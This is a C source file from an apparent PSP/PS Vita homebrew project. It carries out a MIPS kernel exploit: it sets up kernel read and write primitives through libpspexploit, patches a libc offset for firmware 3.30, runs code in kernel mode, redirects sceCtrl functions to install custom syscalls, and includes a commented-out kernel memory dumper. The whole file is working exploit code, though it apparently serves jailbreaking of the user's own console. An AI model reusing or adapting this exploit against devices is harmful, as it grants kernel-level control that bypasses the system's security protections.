/* mips.c -- implementation of the mips kernel exploit
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>
#include <psputility.h>

#include <stdio.h>
#include <string.h>

#include "mips.h"
#include "rpc.h"

#include <libpspexploit.h>

void (*_sceKernelIcacheInvalidateAll)(void);
void (*_sceKernelDcacheInvalidateRange)(const void* p, unsigned int size);
void (*_sceKernelDcacheWritebackInvalidateAll)(void);

int (*_sceMeRequest)(int cmd, ...);

int (*_sceKermitRequest)(KermitRequest* request, int mode, int cmd, int argc, int is_callback, u64* resp);
int (*_sceKermitMemoryArgument)(KermitRequest* request, int arg, const void *data, int size, int mode);

volatile int kernel_hacked = 0;

static int kernel_function(void)
{
	unsigned int k1 = pspSdkSetK1(0);
	unsigned int intc = pspSdkDisableInterrupts();

	kernel_hacked = 1;
	pspDebugScreenPrintf("kernel hello!\n");

	// Find functions
	_sceKernelIcacheInvalidateAll = (void*)pspXploitFindFunction("sceSystemMemoryManager", "UtilsForKernel", 0x920F104A);
	_sceKernelDcacheInvalidateRange = (void*)pspXploitFindFunction("sceSystemMemoryManager", "UtilsForKernel", 0xBFA98062);
	_sceKernelDcacheWritebackInvalidateAll = (void*)pspXploitFindFunction("sceSystemMemoryManager", "UtilsForKernel", 0xB435DEC5);
	_sceMeRequest = (void*)pspXploitFindFunction("sceMeCodecWrapper", "sceMeCore_driver", 0xFA398D71);
	_sceKermitRequest = (void*)pspXploitFindFunction("sceKermit_Driver", "sceKermit_driver", 0x4F75AA05);
	if (!_sceKermitRequest)
		_sceKermitRequest = (void*)pspXploitFindFunction("sceKermit_Driver", "sceKermit_driver", 0x36666181);
	_sceKermitMemoryArgument = (void*)pspXploitFindFunction("sceLowIO_Driver", "sceKermitMemory_driver", 0xAAF047AC);

	kernel_hacked = 2;

	// Repair sysmem
	pspXploitRepairKernel();

	kernel_hacked = 3;

	// Install syscalls
	REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0x3A622550), _read_native);
	REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0xC152080A), _syscall);
	REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0x1F803938), _call);
	REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0x60B81F86), _init_rpc);
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	kernel_hacked = 4;

	pspSdkEnableInterrupts(intc);
	pspSdkSetK1(k1);
	return 0;
}

#include <pspdebug.h>

// patching the actual library is too much work (:
int patch_kwrite(void)
{
	// find libc_clock_offset
	u32 libc_clock_offset_addr = 0;

	u32* ptr = (u32*)kwriter_fakeuid.init;
	if (ptr != NULL && ptr[20] == 0x00001025 && ptr[21] == 0x03E00008)
	{
		u32 lui = ptr[17];
		u32 sw  = ptr[19];

		u16 lui_off = (u16)(lui & 0xFFFF);
		s16 sw_off  = (s16)(sw & 0xFFFF);

		libc_clock_offset_addr = ((u32)lui_off << 16) + (s32)sw_off;
		pspDebugScreenPrintf("libc_clock_offset_addr is 0x%08X\n", libc_clock_offset_addr);
	}
	else
	{
		pspDebugScreenPrintf("libpspexploit layout changed?!\n");
		return -1;
	}

	if (libc_clock_offset_addr != 0)
	{
		u32* libc_clock_offset = (u32*)libc_clock_offset_addr;
		pspDebugScreenPrintf("value of libc_clock_offset is 0x%08X\n", *libc_clock_offset);
		// only do it if using the psp 6.60 value
		// yes, it won't work on psp then, but that's fine...
		if (*libc_clock_offset == 0x88014400)
		{
			*libc_clock_offset = 0x88014640;
			pspDebugScreenPrintf("now patched to 3.30 value :) [0x88014640]\n");
		}
		else
		{
			pspDebugScreenPrintf("NOT PATCHING!!! ASSUMED TO BE CORRECT!\n");
		}
		return 0;
	}

	return -2;
}

/*
// the elf alone is confusing, much easier to use this instead.
static int dump_sysmem(void)
{
	const u32 sysmem_start = 0x88000000;
	const u32 sysmem_size = 0x20000; //0x14F40; // guessed
	const u32 partition_size = 0x1000;

	SceUID uid = sceKernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, "sysmem_read", PSP_SMEM_High, partition_size, NULL);
	if (uid < 0)
		return uid;
	
	void* ptr = sceKernelGetBlockHeadAddr(uid);
	if (!ptr)
		return 0xDEADBEEF;
	
	SceUID fd = sceIoOpen("ms0:sysmem.bin", PSP_O_WRONLY|PSP_O_CREAT, 0777);
	if (fd < 0)
	{
		sceKernelFreePartitionMemory(uid);
		return fd;	
	}

	for (int i = 0; i < sysmem_size; i += partition_size)
	{
		for (int j = 0; j < partition_size; j += 4)
		{
			*(u32*)((char*)ptr + j) = pspXploitRead32((void*)(0x88000000 + i + j));
		}

		sceIoWrite(fd, ptr, partition_size);
	}

	sceIoClose(fd);
	sceKernelFreePartitionMemory(uid);
	return 0;
}
*/

int exploit_mips_kernel(void)
{
	int res;

	kernel_hacked = 0;

	pspXploitConfigure(&kreader_netmcopyback, &kwriter_fakeuid);
	pspDebugScreenPrintf("kreader: netmcopyback\n");
	pspDebugScreenPrintf("kwriter: fakeuid\n");

	res = pspXploitInitKernelExploit();
	pspDebugScreenPrintf("pspXploitInitKernelExploit returned 0x%08X\n", res);
	if (res < 0)
		return res;

//	res = dump_sysmem();
//	pspDebugScreenPrintf("dump_sysmem returned 0x%08X\n", res);
//	if (res < 0)
//		return res;

	// todo: this is so stupid...
	res = patch_kwrite();
	pspDebugScreenPrintf("patch_kwrite returned 0x%08X\n", res);
	if (res < 0)
		return res;

	res = pspXploitDoKernelExploit();
	pspDebugScreenPrintf("pspXploitDoKernelExploit returned 0x%08X\n", res);
	if (res < 0)
		return res;

	pspXploitExecuteKernel((void*)&kernel_function);

	pspDebugScreenPrintf("kernel_hacked: 0x%08X\n", kernel_hacked);
	if (kernel_hacked == 0)
		return 0xDEADBEEF;

	return 0;
}
